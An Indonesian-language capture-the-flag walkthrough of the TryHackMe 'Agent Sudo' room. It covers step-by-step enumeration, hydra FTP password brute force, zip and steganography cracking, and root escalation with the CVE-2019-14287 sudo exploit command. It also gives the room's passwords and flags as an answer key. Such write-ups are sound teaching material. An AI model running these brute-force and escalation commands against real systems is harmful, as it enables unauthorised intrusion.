# CTF Agent Sudo
- TryHackMe Room: https://tryhackme.com/room/agentsudoctf
- IP Machine: 10.10.235.249

## Task 2 - Enumerate
- Lakukan port scanning dengan tool `nmap`
```sh
nmap -sV -sC <IP Machine>
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%201.JPG)

- Buka halaman web `http://<IP_machine>` di browser. Disini diperoleh clue untuk mengganti nilai user-agent dengan kode nama

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%202.JPG)

- Di petunjuk soal, disarankan untuk mencoba **user-agent: C**. Jalankan tool `Burp Suite` dan pastikan browser sudah terinstall plugin `FoxyProxy`. Buat Intercept dalam kondisi On

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%203.JPG)

- Buka browser dan refresh halaman `http://<IP_machine>`, setelah tool `Burp Suite` terbuka ubah nilai User-Agent menjadi **C** lalu klik tombol **Forward**

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%204.JPG)

- Request langsung di redirect ke halaman `http://<IP_machine>/agent_C_attention.php`. Klik tombol **Forward** lagi

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%205.JPG)

- Setelah itu browser terbuka dan langsung berada di halaman `http://<IP_machine>/agent_C_attention.php`. Pada halaman ini diperoleh informasi bahwa agent C bernama **chris**

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%206.JPG)

- **Pertanyaan:** How many open ports?
```sh
3
```

- **Pertanyaan:** How you redirect yourself to a secret page?
```sh
user-agent
```

- **Pertanyaan:** What is the agent name?
```sh
chris
```

## Task 3 Hash cracking and brute-force
- Dikarenakan pertanyaan berikutnya adalah password FTP, maka langkah selanjutnya adalah menemukan password FTP user `chris` dengan melakukan brute force. Gunakan tool `hydra` dan wordlists `rockyou.txt` yang terdapat di kali linux untuk melakukan brute force
```sh
hydra -l chris -P /usr/share/wordlists/rockyou.txt <IP_machine> ftp
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%207.JPG)

- Password FTP user `chris` telah berhasil ditemukan, sekarang kita akses FTP Server menggunakan nama user `chris` dan password diatas
```sh
ftp <IP_machine>
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%208.JPG)

- Setelah berhasil login ke FTP Server, ketik `ls` maka disana ditemukan 3 buah file sebagai berikut

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%209.JPG)

- Download satu per satu 3 file tersebut lalu keluar dari FTP Server
```sh
get To_agentJ.txt
get cute-alien.jpg
get cutie.png
bye
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%2010.JPG)

- Buka isi file **To_agentJ.txt**. Disini diperoleh clue bahwa gambar asli tersimpan dalam sebuah direktori dan terdapat sebuah password yang disembunyikan ke dalam gambar
```sh
cat To_agentJ.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%2011.JPG)

- Disini kita bisa menggunakan tool `binwalk` untuk mendeteksi adanya file yang tersembunyi dibalik sebuah file gambar. Dari hasil percobaan, terdapat file zip yang tersembunyi di balik file gambar **cutie.png**
```sh
binwalk cutie.png
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%2012.JPG)

- Gunakan option `-e` untuk mengekstraksi file yang tersembunyi. Disini diperoleh file **8702.zip** yang masih dalam keadaan terpassword
```sh
binwalk -e cutie.png
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%2013.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%2014.JPG)

- Kita bisa melakukan cracking password untuk menemukan password yang digunakan untuk mengekstrak file **8702.zip** dengan tool `john the ripper`. Untuk itu kita perlu mengekstrak hash dari file zip tersebut menggunakan tool `zip2john`
```sh
zip2john 8702.zip 8702-hashzip.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%2015.JPG)

- Sekarang kita crack hash yang diperoleh diatas menggunakan tool `john the ripper`
```sh
john 8702-hashzip.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%2016.JPG)

- Password berhasil ditemukan, sekarang kita ekstrak file **8702.zip** dengan tool `7z` lalu masukkan password diatas
```sh
7z 8702.zip
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%2017.JPG)

- Dari hasil ekstrak file **8702.zip** diperoleh file **To_agentR.txt**. Di dalam file tersebut ditemukan password steganografi yang masih keadaan ter encode
```sh
cat To_agentR.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%2018.JPG)

- Jika diamati dengan seksama password tersebut sepertinya diencode menggunakan base64. Jadi kita bisa menggunakan tool [CyberChef](https://gchq.github.io/CyberChef/) untuk melakukan decode base64 

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%2019.JPG)

- Sekarang kita ekstrak file tersembunyi dibalik gambar (steganografi) di file **cute-alien.jpg** dengan tool `steghide` lalu masukkan passphrase yang sudah ditemukan diatas
```sh
steghide extract -sf cute-alien.jpg
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%2020.JPG)

- Setelah proses ekstrak berhasil diperoleh file **message.txt**. Di dalam tersebut diperoleh nama user **james** dan password **hackerrules!** yang sepertinya bisa kita gunakan untuk login SSH
```sh
cat message.txt
``` 

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%2021.JPG)

- **Pertanyaan:** FTP password
```sh
crystal
```

- **Pertanyaan:** Zip file password
```sh
alien
```

- **Pertanyaan:** steg password
```sh
Area51
```

- **Pertanyaan:** Who is the other agent (in full name)?
```sh
james
```

- **Pertanyaan:** SSH password
```sh
hackerrules!
```

## Task 4 Capture the user flag
- Login ke SSH menggunakan user `james`, jika terdapat pesan konfirmasi ketik `yes` lalu masukkan password yang sudah ditemukan diatas
```sh
ssh james@<IP Machine>
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%2022.JPG)

- Setelah berhasil login, ketik `ls` maka disana terdapat 2 buah file yaitu **user_flag.txt** yang berisi user flag dan file gambar **Alien_autospy.jpg**. Buka isi file **user_flag.txt** untuk mendapatkan user flag
```sh
cat user_flag.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%2023.JPG)

- Untuk bisa melihat gambar dari file **Alien_autospy.jpg** kita perlu mengcopy file tersebut ke local. Jika kita ketik perintah `pwd` posisi directory berada di **/home/james**
```sh
pwd
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%2024.JPG)

- Copy file **Alien_autospy.jpg** yang berada di directory **/home/james** dari server ke local menggunakan tool `scp`
```sh
scp james@<IP Machine>:/home/james/Alien_autospy.jpg .
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%2025.JPG)

- Setelah berhasil mengcopy ke local, diperoleh file gambar **Alien_autospy.jpg** sebagai berikut

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%2026.JPG)

- Kita bisa menelusuri lewat Google untuk menemukan informasi mengenai gambar diatas

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%2027.JPG)

- Dari hasil penelurusan google diperoleh informasi sebagai berikut

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%2028.JPG)

- **Pertanyaan:** What is the user flag?
```sh
b03d975e8c92a7c04146cfa7a5a313c7
```

- **Pertanyaan:** What is the incident of the photo called?
```sh
Roswell alien autopsy
```

## Task 5 Privilege escalation
- Lakukan pengecekan apakah user `james` punya akses ke sudo. Setelah dilakukan pengecekan diperoleh keterangan `(ALL, !root) /bin/bash`
```sh
sudo -l
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%2029.JPG)

- Cari tahu lewat google bagaimana cara mengeksploitasi `(ALL, !root) /bin/bash` untuk mendapatkan akses user root

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%2030.JPG)

- Dari sumber https://www.exploit-db.com/exploits/47502 diketahui cara untuk mengeksploitasinya adalah dengan perintah sebagai berikut

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%2031.JPG)

- Jalankan perintah diatas untuk mendapatkan akses user root
```sh
sudo -u#-1 /bin/bash
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%2032.JPG)

- Buka root flag yang berada di **/root/root.txt**
```sh
cat /root/root.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Agent%20Sudo/assets/as%2033.JPG)

- **Pertanyaan:** CVE number for the escalation
- **Petunjuk:** Lihat hasil searching google diatas 
```sh
CVE-2019-14287
```

- **Pertanyaan:** What is the root flag?
```sh
b53a02f55b57d4439e3341834d70c062
```

- **Pertanyaan:** (Bonus) Who is Agent R?
```sh
Deskel
```